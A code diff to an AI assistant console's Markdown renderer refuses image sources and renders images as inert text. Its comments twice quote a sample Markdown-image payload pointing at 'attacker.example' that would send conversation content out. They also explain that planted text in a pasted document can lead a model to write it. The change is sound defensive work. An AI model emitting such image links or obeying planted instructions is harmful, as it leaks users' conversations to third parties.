@@ -14,6 +14,12 @@
 //     cannot become a clickable payload.
 //   • every external link carries `rel="noopener noreferrer"`, so a linked page cannot reach
 //     back through `window.opener`.
+//   • ★ NO IMAGE IS EVER LOADED. An `href` is inert until someone clicks it; a `src` is fetched
+//     the moment it renders. `![](https://attacker.example/?d=…)` would therefore exfiltrate
+//     conversation content with no click and no warning — the classic Markdown-image channel,
+//     reachable through a model's own confusion or through text planted in a document the
+//     reader pasted. `src` is refused for every scheme AND `img` renders inert text, so the
+//     allowlist and the component would each have to fail for anything to load.
 //
 // GFM is enabled because tables and fenced code are how technical answers are actually
 // written, and rendering them as raw pipes and backticks would make the console worse at the
@@ -32,8 +38,18 @@ const ALLOWED_SCHEMES = new Set(['http:', 'https:', 'mailto:']);
 /**
  * The URL allowlist. Returns the URL when it is safe to render as an attribute, and `null` to
  * drop it. Exported so the policy is unit-testable without rendering a component.
+ *
+ * ★ `attribute` MATTERS, AND CONFLATING href WITH src IS AN EXFILTRATION BUG. An `href` is
+ * inert until a person clicks it. A `src` is fetched by the browser the moment it renders, with
+ * no click and no warning — so a model told to write
+ * `![](https://attacker.example/?d=<conversation>)`, whether by its own confusion or by text
+ * planted in a document the reader pasted, would send the conversation to a third party just by
+ * being displayed. The same https: URL is therefore SAFE as a link and NEVER safe as a source.
  */
-export function safeUrl(url: string): string | null {
+export function safeUrl(url: string, attribute: string = 'href'): string | null {
+  // Nothing auto-loads. See the note above: `src` is the attribute that fetches without a
+  // click, and this console renders no images at all (images are a declared non-goal).
+  if (attribute === 'src') return null;
   const value = url.trim();
   if (value.length === 0) return null;
   // A same-document fragment or a relative path has no scheme and cannot execute.
@@ -96,6 +112,7 @@ function CodeBlock({ code, children }: { code: string; children: ReactNode }) {
 }
 
 export function AssistantMarkdown({ text }: { text: string }) {
+  const { t } = useI18n();
   return (
     <div
       className="govai-answer max-w-none text-[length:var(--govai-text-base)] leading-relaxed text-[var(--govai-text-primary)]"
@@ -103,8 +120,25 @@ export function AssistantMarkdown({ text }: { text: string }) {
     >
       <Markdown
         remarkPlugins={[remarkGfm]}
-        urlTransform={safeUrl}
+        urlTransform={(url, key) => safeUrl(url, key)}
         components={{
+          // ★ NO <img> IS EVER EMITTED. Images are a declared non-goal of this delivery, and an
+          // image is the one Markdown construct the browser fetches without a click — the
+          // exfiltration channel described on `safeUrl`. The alt text is shown instead, marked
+          // as an image that was not loaded, so the reader knows the model referred to one
+          // rather than silently seeing nothing. Belt and braces with the `src` rule above:
+          // this component would render inert text even if the allowlist were loosened.
+          img: ({ alt, src }) => (
+            <span
+              className="govai-mono rounded-[3px] border border-[var(--govai-border)] bg-[var(--govai-bg-inset)] px-[4px] py-[1px] text-[length:var(--govai-text-2xs)] text-[var(--govai-text-secondary)]"
+              data-testid="assistant-image-blocked"
+              data-blocked-src={typeof src === 'string' && src.length > 0 ? 'yes' : undefined}
+              title={t('ai.markdown.imageBlocked')}
+            >
+              {t('ai.markdown.imageBlocked')}
+              {typeof alt === 'string' && alt.length > 0 ? `: ${alt}` : ''}
+            </span>
+          ),
           a: ({ children, href, ...props }) => (
             <a
               {...props}
